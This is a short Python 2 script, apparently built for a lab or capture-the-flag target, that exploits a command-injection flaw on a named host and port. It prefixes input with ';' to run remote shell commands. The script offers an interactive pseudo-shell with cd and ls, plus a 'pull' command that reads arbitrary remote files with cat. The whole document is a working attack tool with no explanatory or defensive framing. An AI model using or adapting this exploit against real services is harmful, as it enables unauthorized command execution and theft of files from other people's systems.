import socket
import sys
import fileinput
import time

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

def execute_shell():
    # Establish socket connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    time.sleep(2)
    data = s.recv(1024)
    data = ""     # Receives and deletes opening banner

    done = False
    directory = "/"

    while done != True:
        sys.stdout.write("%s> " % directory)

        cmd = raw_input();
        temp = str(cmd).split(' ')

        if temp[0] == "cd":
            directory = temp[1]
            s.send("; cd %s\n" % temp[1])
            time.sleep(2)
            data = s.recv(1024)
            print data
        if cmd == "ls":
            s.send("; ls\n")
            time.sleep(2)
            data = s.recv(1024)
            sys.stdout.write(data)
        elif cmd == "quit":
            done = True
        else:
            print "Invalid command\n"

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        time.sleep(2)
        data = s.recv(1024)
        data = ""



def execute_pull(remote_path):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    time.sleep(2)
    data = s.recv(1024)
    data = ""

    s.send("; cat %s\n" % remote_path)
    time.sleep(2)
    data = s.recv(1024)
    print(data)

if __name__ == '__main__':
    done = False

    while done != True:
        sys.stdout.write("> ")

        command = raw_input();
        temp = str(command).split(' ')

        if command == "shell":
            execute_shell()
        elif command == "help":
            raw_input("Please type either \"shell\", \"pull\", or \"quit\"\n> ")
        elif temp[0] == "pull":
            execute_pull(temp[1])
        elif command == "quit":
            done = True
        else:
            print "Incorrect command\n"






